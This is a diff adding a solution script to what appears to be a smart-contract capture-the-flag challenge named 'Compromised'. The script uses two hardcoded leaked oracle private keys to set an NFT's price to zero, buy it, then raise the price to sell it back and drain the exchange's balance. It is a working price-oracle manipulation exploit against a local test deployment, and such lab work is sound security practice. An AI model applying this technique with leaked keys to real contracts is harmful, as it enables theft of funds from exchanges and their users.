@@ -61,6 +61,73 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        
+        // Leaked private key
+        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+        // Create new instance to connect from privateKey
+        const oracle1 = new ethers.Wallet(key1, ethers.provider); 
+        const oracle2 = new ethers.Wallet(key2, ethers.provider);
+        
+        console.log(
+            'Exchange balance before attack:', 
+            String(await ethers.provider.getBalance(this.exchange.address))
+        )
+
+        console.log(
+            'Attacker balance before attack:', 
+            String(await ethers.provider.getBalance(attacker.address))
+        )
+
+        console.log(
+            'NFT price before attack: ',
+            String(await this.oracle.getMedianPrice("DVNFT")).slice(0, -18)
+        )
+
+        console.log("-------------------------------------------------------------------")
+
+        // Set NFT price to 0 wei
+        await this.oracle.connect(oracle1).postPrice("DVNFT", 0);
+        await this.oracle.connect(oracle2).postPrice("DVNFT", 0);
+
+        // Buy 1 NFT for 1 wei
+        await this.exchange.connect(attacker).buyOne({value: 1});
+
+        // Set NFT price to 9999 ether + 1 wei
+        await this.oracle.connect(oracle1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(oracle2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        console.log(
+            'NFT price during attack: ',
+            String(await this.oracle.getMedianPrice("DVNFT")).slice(0, -18)
+        )
+
+        console.log("-------------------------------------------------------------------")
+
+        // Approve NFT #0 to be sell on this exchange
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0)
+        await this.exchange.connect(attacker).sellOne(0);
+
+        // Reset price to initial 999 ether
+        await this.oracle.connect(oracle1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(oracle2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        console.log(
+            'Exchange balance after attack:', 
+            String(await ethers.provider.getBalance(this.exchange.address))
+        )
+
+        console.log(
+            'Attacker balance after attack:', 
+            String(await ethers.provider.getBalance(attacker.address))
+        )
+
+        console.log(
+            'NFT price after attack: ',
+            String(await this.oracle.getMedianPrice("DVNFT")).slice(0, -18)
+        )
+
     });
 
     after(async function () {
